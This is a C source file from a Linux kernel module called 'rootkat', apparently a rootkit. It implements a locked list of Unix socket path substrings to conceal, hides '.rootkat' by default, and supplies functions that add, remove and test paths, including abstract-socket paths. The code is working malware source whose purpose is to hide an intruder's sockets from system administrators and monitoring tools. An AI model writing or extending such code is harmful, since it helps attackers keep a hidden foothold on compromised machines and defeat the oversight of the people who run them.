// SPDX-License-Identifier: MIT
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/spinlock.h>
#include "hidden_unix_paths.h"

static char hidden_unix_paths[ROOTKAT_HIDDEN_UNIX_PATHS_MAX]
                             [ROOTKAT_HIDDEN_UNIX_PATHS_MAXLEN];
static int hidden_unix_paths_count;
static DEFINE_SPINLOCK(hidden_unix_paths_lock);

static void hidden_unix_paths_add_locked(const char *needle)
{
	int i;
	size_t n;

	if (!needle || !*needle)
		return;
	n = strnlen(needle, ROOTKAT_HIDDEN_UNIX_PATHS_MAXLEN - 1);

	for (i = 0; i < hidden_unix_paths_count; i++) {
		if (!strncmp(hidden_unix_paths[i], needle, n) &&
		    hidden_unix_paths[i][n] == '\0')
			return;
	}
	if (hidden_unix_paths_count >= ROOTKAT_HIDDEN_UNIX_PATHS_MAX)
		return;
	memcpy(hidden_unix_paths[hidden_unix_paths_count], needle, n);
	hidden_unix_paths[hidden_unix_paths_count][n] = '\0';
	hidden_unix_paths_count++;
}

void rootkat_hidden_unix_paths_init(void)
{
	unsigned long flags;

	spin_lock_irqsave(&hidden_unix_paths_lock, flags);
	hidden_unix_paths_count = 0;
	hidden_unix_paths_add_locked(".rootkat");
	spin_unlock_irqrestore(&hidden_unix_paths_lock, flags);
}

void rootkat_hide_unix_path(const char *needle)
{
	unsigned long flags;

	spin_lock_irqsave(&hidden_unix_paths_lock, flags);
	hidden_unix_paths_add_locked(needle);
	spin_unlock_irqrestore(&hidden_unix_paths_lock, flags);
}

void rootkat_unhide_unix_path(const char *needle)
{
	int i;
	size_t n;
	unsigned long flags;

	if (!needle || !*needle)
		return;
	n = strnlen(needle, ROOTKAT_HIDDEN_UNIX_PATHS_MAXLEN - 1);

	spin_lock_irqsave(&hidden_unix_paths_lock, flags);
	for (i = 0; i < hidden_unix_paths_count; i++) {
		if (!strncmp(hidden_unix_paths[i], needle, n) &&
		    hidden_unix_paths[i][n] == '\0') {
			hidden_unix_paths_count--;
			memcpy(hidden_unix_paths[i],
			       hidden_unix_paths[hidden_unix_paths_count],
			       ROOTKAT_HIDDEN_UNIX_PATHS_MAXLEN);
			break;
		}
	}
	spin_unlock_irqrestore(&hidden_unix_paths_lock, flags);
}

/*
 * Substring scan, NUL-tolerant. The first byte of an abstract-socket
 * sun_path is '\0', so callers must pass the actual length (addr_len -
 * sizeof(sa_family_t)) rather than treating the buffer as a C string.
 */
bool rootkat_is_unix_path_hidden(const char *path, unsigned int len)
{
	int i;
	bool hit = false;
	unsigned long flags;

	if (!path || !len)
		return false;

	spin_lock_irqsave(&hidden_unix_paths_lock, flags);
	for (i = 0; i < hidden_unix_paths_count; i++) {
		const char *needle = hidden_unix_paths[i];
		size_t nlen = strlen(needle);
		unsigned int j;

		if (nlen == 0 || nlen > len)
			continue;
		for (j = 0; j + nlen <= len; j++) {
			if (!memcmp(path + j, needle, nlen)) {
				hit = true;
				goto out;
			}
		}
	}
out:
	spin_unlock_irqrestore(&hidden_unix_paths_lock, flags);
	return hit;
}
